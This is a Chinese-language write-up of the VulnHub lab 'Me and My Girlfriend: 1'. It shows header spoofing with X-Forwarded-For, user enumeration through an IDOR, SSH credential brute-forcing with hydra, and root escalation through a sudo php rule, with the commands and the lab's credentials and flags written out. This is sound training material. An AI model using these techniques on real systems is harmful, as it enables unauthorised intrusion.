# ME AND MY GIRLFRIEND: 1

2025.02.13 https://www.vulnhub.com/entry/me-and-my-girlfriend-1,409/

[video](https://www.bilibili.com/video/BV12NKHerEAD/?spm_id_from=333.1387.upload.video_card.click&vd_source=aed2f374c732513d2e535afafb1fd2ec)

## Ip

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

先访问 80 web 首页，得到提示：

```
Who are you? Hacker? Sorry This Site Can Only Be Accessed local!<!-- Maybe you can search how to use x-forwarded-for -->
```

要添加 x-forwarded-for 为 127.0.0.1 才能进行访问。添加后出现的网址是: http://192.168.5.40/?page=index 这里可能存在文件包含。

```
curl -H 'X-Forwarded-For: 127.0.0.1' -vv http://192.168.5.40

Location: ?page=index
```

直接在浏览器中使用这个插件 X-Forwarded-For Header 可以自动添加 xff 请求头，在注册功能处 http://192.168.5.40/index.php?page=register 注册一个账号，登陆进去后，可以看到 http://192.168.5.40/index.php?page=profile&user_id=12 这里可以修改 user_id 1 至 12 实现用户信息遍历，最终拿到了如下的用户信息：

```
eweuhtandingan:skuyatuh
aingmaung:qwerty!!!
sundatea:indONEsia
sedihaingmah:cedihhihihi
alice:4lic3
abdikasepak:dorrrrr
```

使用上面得到的用户登陆凭据，尝试 ssh 登陆，

```
hydra -t 20 -C cred.txt  ssh://192.168.5.40

[22][ssh] host: 192.168.5.40   login: alice   password: 4lic3
```

使用 alice:4lic3 进行 ssh 登陆, 得到第一个 flag，并得到了一个 note 提示：

```
alice@gfriEND:~$ cd .my_secret/
alice@gfriEND:~/.my_secret$ ls
flag1.txt  my_notes.txt
alice@gfriEND:~/.my_secret$ cat flag1.txt
Greattttt my brother! You saw the Alice's note! Now you save the record information to give to bob! I know if it's given to him then Bob will be hurt but this is better than Bob cheated!

Now your last job is get access to the root and read the flag ^_^

Flag 1 : gfriEND{2f5f21b2af1b8c3e227bcf35544f8f09}
alice@gfriEND:~/.my_secret$ cat my_notes.txt
Woahhh! I like this company, I hope that here i get a better partner than bob ^_^, hopefully Bob doesn't know my notes
```

sudo -l 后显示 (root) NOPASSWD: /usr/bin/php ， 可以直接提权到 root 拿到第 2 个 flag：

```
sudo -u root php -r "system('/bin/bash');"

root@gfriEND:/home# cd /root
root@gfriEND:/root# ls
flag2.txt
root@gfriEND:/root# cat flag2.txt

  ________        __    ___________.__             ___________.__                ._.
 /  _____/  _____/  |_  \__    ___/|  |__   ____   \_   _____/|  | _____     ____| |
/   \  ___ /  _ \   __\   |    |   |  |  \_/ __ \   |    __)  |  | \__  \   / ___\ |
\    \_\  (  <_> )  |     |    |   |   Y  \  ___/   |     \   |  |__/ __ \_/ /_/  >|
 \______  /\____/|__|     |____|   |___|  /\___  >  \___  /   |____(____  /\___  /__
        \/                              \/     \/       \/              \//_____/ \/

Yeaaahhhh!! You have successfully hacked this company server! I hope you who have just learned can get new knowledge from here :) I really hope you guys give me feedback for this challenge whether you like it or not because it can be a reference for me to be even better! I hope this can continue :)

Contact me if you want to contribute / give me feedback / share your writeup!
Twitter: @makegreatagain_
Instagram: @aldodimas73

Thanks! Flag 2: gfriEND{56fbeef560930e77ff984b644fde66e7}
```
